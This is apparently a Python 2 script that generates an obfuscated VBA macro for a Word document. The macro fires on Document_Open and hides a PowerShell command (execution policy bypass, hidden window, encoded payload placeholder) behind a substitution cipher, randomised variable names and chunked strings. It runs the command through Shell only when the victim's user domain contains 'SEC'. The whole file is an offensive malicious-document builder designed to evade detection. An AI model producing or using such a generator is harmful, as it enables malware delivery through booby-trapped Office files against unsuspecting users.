import random, string, numpy as np

#cmd = "C:\Windows\System32\WindowsPowerShell\v1.0\pOWErsHeLl.exe -NoLO -Sta -NoPR -NoNI -Windo 1 -eNCo ASDF...."
cmd = "POwershEll -Sta -nonInteR -exECutIoNPo ByPAsS -nOPROfiL  -WIN  HIDdE  -NoLOGo  -cO   \"ASDF....\""

def rand_var(min_len=3, max_len=6):
  result = "".join(random.choice(string.letters) for i in range(random.randint(3,6)))
  return result

def encrypt(plaintext, key, alphabet):
  keyIndices = [alphabet.index(k) for k in plaintext]
  return "".join(key[keyIndex] for keyIndex in keyIndices)

def decrypt(cipher, key, alphabet):
  keyIndices = [key.index(k) for k in cipher]
  return "".join(alphabet[keyIndex] for keyIndex in keyIndices)

def format_string(name, value):
  n = random.randint(950, 1020)
  chunks = [value[i:i+n] for i in range(0, len(value), n)]
  result = "%s(1) = \"%s\" & _\n" % (name, chunks[0])
  for chunk in chunks[1:]:
    result += "\"%s\" & _\n" % chunk
  return result.rstrip("\n").rstrip("_").rstrip(" ").rstrip("&").rstrip(" ")

def distill(string):
  uniq = np.unique(list(string)).tostring()
  result = "".join(random.sample(uniq,len(uniq)))
  return result

def doc_type(input):
  if input.lower() == "word":
    return "Document"
  elif input.lower() == "excel":
    return "Workbook"
  else:
    return "Document"

sub1 = distill(cmd)
sub2 = distill(cmd)

def gen_macro():
  k1 = rand_var() # Key One
  k2 = rand_var() # Key Two
  a1 = rand_var() # Array of strings to decode
  s1 = rand_var() # User domain envirnoment variable
  v1 = rand_var() # Variant for counting
  t1 = rand_var() # Temp Result
  i_a1 = rand_var() # Index of string in array
  i_v1 = rand_var() # Index of current character in Main string (v1)
  i_k1 = rand_var() # Index of current character in Key 1 (k1)
  i_k2 = rand_var() # Index of current character in key 2 (k2)

  macro = "Private Sub %s_Open()\n" % doc_type("word")
  macro += "Dim %s, %s, %s, %s, %s(1) As String\n" % (s1, k1, k2, t1, a1)
  macro += "%s = \"%s\"\n" % (k1, sub1)
  macro += "%s = \"%s\"\n" % (k2, sub2)
  macro += "%s\n" % format_string(a1, encrypt(cmd, sub1, sub2))
  macro += "%s = UCase(Environ(\"USERDOMAIN\"))\n" % s1
  macro += "If InStr(%s, \"SEC\") > 0 Then\n" % s1
  macro += "For %s = 1 To UBound(%s)\n" % (i_a1, a1)
  macro += "%s = \"\"\n" % t1
  macro += "For %s = 1 To Len(%s(%s))\n" % (i_v1, a1, i_a1)
  macro += "For %s = 1 To Len(%s)\n" % (i_k1, k1)
  macro += "If (Mid(%s(%s), %s, 1) = Mid(%s, %s, 1)) Then Exit For\n" % (a1, i_a1, i_v1, k1, i_k1)
  macro += "Next %s\n" % i_k1
  macro += "%s = %s & Mid(%s, %s, 1)\n" % (t1, t1, k2, i_k1)
  macro += "Next %s\n" % i_v1
  macro += "%s(%s) = %s\n" % (a1, i_a1, t1)
  macro += "Next %s\n" % i_a1
  macro += "Shell %s(1)\n" % a1
  macro += "End If\n"
  macro += "End Sub\n"

  return macro

print gen_macro()
